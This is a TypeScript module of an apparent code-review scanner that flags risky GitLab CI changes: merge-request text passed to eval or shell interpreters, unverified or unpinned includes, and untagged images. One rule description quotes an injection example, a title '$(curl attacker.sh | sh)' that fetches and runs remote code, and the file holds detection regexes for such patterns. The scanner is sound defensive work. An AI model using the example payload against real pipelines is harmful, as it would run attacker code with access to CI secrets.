import { RiskCategory, RiskSeverity } from "@walkdiff/review-model"
import type { Risk } from "@walkdiff/review-model"
import { addedLines, findingAt } from "../scannedFile.ts"
import type { RuleDescription, ScannedFile } from "../scannedFile.ts"
import { IncludeKind, parseGitlabCi } from "./gitlabCi.ts"
import type { GitlabCiConfig, GitlabInclude, LocatedText } from "./gitlabCi.ts"
import { PipelineSystem } from "./pipelineFiles.ts"
import type { PipelineFile } from "./pipelineFiles.ts"

function gitlabRule(id: string, severity: RiskSeverity, title: string, detail: string): RuleDescription {
  return { id: `gitlab-ci.${id}`, category: RiskCategory.CodeScan, severity, title, detail }
}

const MR_TEXT_AS_COMMAND = gitlabRule(
  "mr-text-as-command",
  RiskSeverity.High,
  "Merge request text run as a command",
  "Anyone who opens a merge request chooses its title, description, branch name and commit messages. Here one of them is passed to eval or a `-c`/`-e` interpreter, so a title such as `$(curl attacker.sh | sh)` runs with this job's variables. Pass it as an argument or environment variable instead.",
)
const REMOTE_INCLUDE = gitlabRule(
  "remote-include-unverified",
  RiskSeverity.Medium,
  "Remote include without integrity",
  "GitLab runs whatever this URL returns each time the pipeline starts, with the project's CI variables. Add `integrity: sha256-…` (GitLab 17.9 and later) so a changed file fails the pipeline, or copy the file into the repository.",
)
const PROJECT_INCLUDE = gitlabRule(
  "project-include-unpinned",
  RiskSeverity.Medium,
  "Include from another project without a ref",
  "Without `ref`, GitLab uses the other project's default branch, so anyone who can push there changes this pipeline. Pin it to a tag or commit.",
)
const COMPONENT_INCLUDE = gitlabRule(
  "component-unpinned",
  RiskSeverity.Medium,
  "CI component on a moving version",
  "`~latest` or a branch name follows whatever the component's owners publish next. Pin a released version or a commit SHA.",
)
const UNPINNED_IMAGE = gitlabRule(
  "image-unpinned",
  RiskSeverity.Low,
  "Container image without a version",
  "With no tag, or `latest`, each run can pull a different image, so a compromised or broken release reaches this pipeline unseen. Pin a version tag, or a digest for the strongest guarantee.",
)

// Values a merge request's author sets. Slugs are left out: GitLab strips them to safe characters.
const MR_CONTROLLED_VARIABLE = /\$\{?(?:CI_MERGE_REQUEST_(?:TITLE|DESCRIPTION|SOURCE_BRANCH_NAME)|CI_COMMIT_(?:MESSAGE|TITLE|DESCRIPTION|TAG_MESSAGE|REF_NAME|BRANCH)|CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME)\b/
// The shell expands a variable into a single argument, which is safe; these evaluate it again as code.
const EVALUATES_TEXT = /\beval\b|\b(?:ba|z|da|k)?sh\s+-c\b|\b(?:python3?|node|perl|ruby)\s+-[ce]\b/
const RELEASED_COMPONENT_VERSION = /@(?:\d+(?:\.\d+){0,2}(?:-[\w.]+)?|[0-9a-f]{40})$/
const IMAGE_TAG_OR_DIGEST = /(?::([\w][\w.-]{0,127})|@sha256:[0-9a-f]{64})$/
const LATEST_TAG = "latest"

/** Flags risky GitLab CI on added lines of the changed GitLab CI files. */
export function scanGitlabCi(files: readonly ScannedFile[], pipeline: readonly PipelineFile[]): Risk[] {
  const gitlabPaths = new Set(pipeline.filter((file) => file.system === PipelineSystem.GitlabCi).map((file) => file.path))
  return files.flatMap((file) => {
    if (file.after === undefined || !gitlabPaths.has(file.diff.path)) return []
    const added = new Map(addedLines(file.diff).map((line) => [line.line, line.content]))
    const path = file.diff.path
    return problemsIn(parseGitlabCi(file.after)).flatMap(({ rule, line }) => {
      const content = added.get(line)
      return content === undefined ? [] : [findingAt(rule, path, line, content)]
    })
  })
}

interface Problem {
  readonly rule: RuleDescription
  readonly line: number
}

function problemsIn(config: GitlabCiConfig): Problem[] {
  return [
    ...config.scriptLines.filter(runsMergeRequestText).map((script) => ({ rule: MR_TEXT_AS_COMMAND, line: script.line })),
    ...config.includes.flatMap((include) => includeProblem(include)),
    ...config.images.filter(isUnpinnedImage).map((image) => ({ rule: UNPINNED_IMAGE, line: image.line })),
  ]
}

function runsMergeRequestText(script: LocatedText): boolean {
  return EVALUATES_TEXT.test(script.text) && MR_CONTROLLED_VARIABLE.test(script.text)
}

function includeProblem(include: GitlabInclude): Problem[] {
  switch (include.kind) {
    case IncludeKind.Remote:
      return include.hasIntegrity ? [] : [{ rule: REMOTE_INCLUDE, line: include.line }]
    case IncludeKind.Project:
      return include.ref === undefined ? [{ rule: PROJECT_INCLUDE, line: include.line }] : []
    case IncludeKind.Component:
      return RELEASED_COMPONENT_VERSION.test(include.component) ? [] : [{ rule: COMPONENT_INCLUDE, line: include.line }]
    case IncludeKind.Local:
    case IncludeKind.Template:
      return []
  }
}

// An image named through a variable is chosen elsewhere, so there's nothing to judge here.
function isUnpinnedImage(image: LocatedText): boolean {
  if (image.text.includes("$")) return false
  const tag = IMAGE_TAG_OR_DIGEST.exec(lastPathSegment(image.text))
  return tag === null || tag[1] === LATEST_TAG
}

// A registry host can carry a port (`registry:5000/app`), which isn't a tag.
function lastPathSegment(image: string): string {
  return image.slice(image.lastIndexOf("/") + 1)
}
